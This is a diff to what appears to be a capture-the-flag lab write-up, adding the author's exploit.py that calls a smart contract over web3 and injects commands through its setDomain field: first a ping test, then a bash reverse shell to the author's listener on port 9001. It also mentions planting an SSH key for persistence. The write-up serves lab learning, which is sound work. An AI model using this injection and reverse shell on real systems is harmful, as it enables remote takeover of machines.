@@ -575,6 +575,42 @@ I managed to obtain a shell as `administrator`! I assumed I would be able to rea
 <p><br></p>
 
 With this in mind, I decided I should probably start digging deeper... But I wanted a better shell first, so I generated my own ssh keypair to establish persistence as `administrator` prior to continuing with my enumeration.
+
+Here is the finalized `exploit.py` I used to obtain my shell as well:
+
+```python
+from web3 import Web3, HTTPProvider
+import json
+
+# Basic configuration variables related to smart contract verification
+
+cAddress = '0xC727e70ded24b8D814627B53ce95cA4cF1d3e2C7' # address.txt
+jsonData = json.loads(open("WeaponizedPing.json", "r").read()) # reads data from .json file
+abi = jsonData['abi'] # sets abi from data
+
+# Web3 connection established to endpoint
+w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
+w3.eth.defaultAccount = w3.eth.accounts[0]
+
+# Specify contract values 
+contract = w3.eth.contract(abi=abi, address=cAddress) # enables 'functions' i.e. contracts.functions.<functionName>()
+contract.functions.setDomain("10.10.14.34; bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'").transact() # calls shell to listener
+```
+
+I believe it is worth noting that I personally ran the the command:
+
+```
+contract.functions.setDomain("10.10.14.34; ping -c 5 10.10.14.34").transact()
+```
+
+Along with my `tcpdump` in order to first verify that I could receive a connection, and then I ran:
+
+```
+contract.functions.setDomain("10.10.14.34; bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'").transact()
+```
+
+I did not run the exploit directly with `python` either. Instead, I ran `python3` and then copy and pasted everything contained in `exploit.py` and did it all manually. I'm sure there is a way to autopwn the first hurdle, but I haven't taken the time to write anything for it so far.
+
 <p><br></p>
 
 ### System Enumeration & User.txt
